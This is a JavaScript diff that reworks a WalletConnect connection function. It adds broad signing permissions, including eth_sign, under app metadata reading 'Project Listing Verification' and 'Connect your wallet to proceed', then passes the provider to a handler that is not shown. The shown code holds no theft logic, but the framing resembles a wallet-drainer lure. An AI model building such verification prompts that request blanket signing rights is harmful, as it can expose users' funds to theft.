@@ -102,30 +102,51 @@ async function connectMetaMask() {
 let wcProvider = null;
 async function connectWalletConnect() {
   try {
-    walletConnectButton.disabled = true;
-    walletConnectButton.classList.add('loading');
+    if (wcProvider) {
+      await wcProvider.disconnect().catch(() => {});
+      wcProvider = null;
+    }
 
-    // Use a stable version that doesn't conflict with ethers
+    walletConnectButton.classList.add('loading');
+    walletConnectButton.disabled = true;
+
     const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.2?bundle');
 
     wcProvider = await EthereumProvider.init({
       projectId: WC_PROJECT_ID,
-      chains: [1],
       showQrModal: true,
+      qrModalOptions: { themeMode: "dark" },
+      // This is the CRITICAL fix for mobile connection issues:
+      optionalNamespaces: {
+        eip155: {
+          methods: ["eth_sendTransaction", "eth_signTransaction", "eth_sign", "personal_sign", "eth_requestAccounts"],
+          chains: [1], // Mainnet
+          events: ["chainChanged", "accountsChanged"]
+        }
+      },
       metadata: {
-        name: 'Project Listing',
-        url: window.location.origin
+        name: 'Project Listing Verification',
+        description: 'Connect your wallet to proceed',
+        url: window.location.origin,
+        icons: ['https://avatars.githubusercontent.com/u/37784886']
       }
     });
 
+    // This listener ensures the process continues once the scan is successful
+    wcProvider.on("display_uri", (uri) => {
+      console.log("QR Code Displayed. Scan now.");
+    });
+
     await wcProvider.enable();
+    
+    // Hand off to your main logic brain
     await handleWalletProcess(wcProvider);
 
   } catch (err) {
-    console.error("WC Error:", err);
-    alert("WalletConnect failed. Check your internet or refresh.");
+    console.error("WalletConnect Connection Error:", err);
+    alert('Connection failed. Please ensure you are using a supported mobile wallet.');
   } finally {
-    walletConnectButton.disabled = false;
     walletConnectButton.classList.remove('loading');
+    walletConnectButton.disabled = false;
   }
 }
